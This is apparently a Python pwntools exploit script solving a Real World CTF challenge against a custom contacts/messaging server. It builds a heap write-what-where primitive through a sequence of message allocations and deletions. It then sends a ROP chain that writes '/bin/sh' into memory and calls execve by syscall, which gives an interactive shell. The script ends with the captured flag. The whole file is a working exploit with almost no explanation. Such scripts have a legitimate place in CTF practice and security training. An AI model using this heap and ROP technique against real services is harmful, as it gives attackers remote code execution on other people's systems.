from pwn import *
import sys

context(arch='amd64', os='linux')

p32b = lambda x: p32(x, endian='big')

def add_to(obj):
	def wrapper(fn):
		setattr(obj, fn.__name__, fn)
		return fn
	return wrapper

@add_to(tube)
def addc(r, contacts):
    l = len(contacts)
    payload = p32b(1) + p32b(l)
    for name, ip in contacts:
        payload += p32b(len(name)) + name + '\x00'
        payload += p32b(len(ip)) + ip +'\x00'
    r.send(payload)
    assert 'success!\n' in r.recvn(0x1000)

@add_to(tube)
def prnc(r):
    r.send(p32b(2))
    s = r.recvn(0x1000)
    return s

@add_to(tube)
def delc(r, idx):
    r.send(p32b(3) + p32b(idx))
    assert 'success!\n' in r.recvn(0x1000)

@add_to(tube)
def addm(r, to, message, l = None):
    if l is None: l = len(message)
    r.send(p32b(4) + p32b(to) + p32b(l) + message + '\x00')
    assert 'success!\n' in r.recvn(0x1000)

@add_to(tube)
def prnm(r):
    r.send(p32b(5))
    #return r.recvn(0x1000)

@add_to(tube)
def delm(r, idx):
    r.send(p32b(6) + p32b(idx))
    assert 'success!\n' in r.recvn(0x1000)

@add_to(tube)
def sendm(r, idx):
    r.send(p32b(7))
    assert 'success!\n' in r.recvn(0x1000)

context.log_level = 'DEBUG'
if len(sys.argv) > 1:
    r = remote('tcp.realworldctf.com', 10917)
else:
    r = process('./server')

pause()

r.addc([('dog', '127.0.0.1')])

@add_to(tube)
def what_where(r, size, d1, d2, what, where):
    r.addm(0, '1' * size)
    r.addm(0, '2' * size)
    r.delm(d1)
    r.delm(d2)
    r.addm(0, '3' * size)
    r.addm(0, p64(where))
    r.addm(0, '4' * size)
    r.addm(0, what)

from struct import pack
p = lambda x : pack('Q', x)
IMAGE_BASE_0 = 0x0000000000400000 # 278f3938f37c4f6f72abf3b8a856c1e2844c26f1ae00ff064ba162921d718dd1
rebase_0 = lambda x : p(x + IMAGE_BASE_0)
rop = ''
rop += rebase_0(0x000000000000e70b) # 0x000000000040e70b: pop r13; ret;
rop += '//bin/sh'
rop += rebase_0(0x0000000000000686) # 0x0000000000400686: pop rdi; ret;
rop += rebase_0(0x00000000002bc0e0)
rop += rebase_0(0x000000000006ab19) # 0x000000000046ab19: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x000000000000e70b) # 0x000000000040e70b: pop r13; ret;
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000000686) # 0x0000000000400686: pop rdi; ret;
rop += rebase_0(0x00000000002bc0e8)
rop += rebase_0(0x000000000006ab19) # 0x000000000046ab19: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000000686) # 0x0000000000400686: pop rdi; ret;
rop += rebase_0(0x00000000002bc0e0)
rop += rebase_0(0x0000000000010df3) # 0x0000000000410df3: pop rsi; ret;
rop += rebase_0(0x00000000002bc0e8)
rop += rebase_0(0x000000000004c7a6) # 0x000000000044c7a6: pop rdx; ret;
rop += rebase_0(0x00000000002bc0e8)
rop += rebase_0(0x000000000004a11c) # 0x000000000044a11c: pop rax; ret;
rop += p(0x000000000000003b)
rop += rebase_0(0x00000000000773c5) # 0x00000000004773c5: syscall; ret;

r.what_where(0x18, 0, 1, p64(0x00484731), 0x06B9140)
r.send('A' * 0x30 + rop)

r.interactive()

# rwctf{Digging_Into_libxdr}
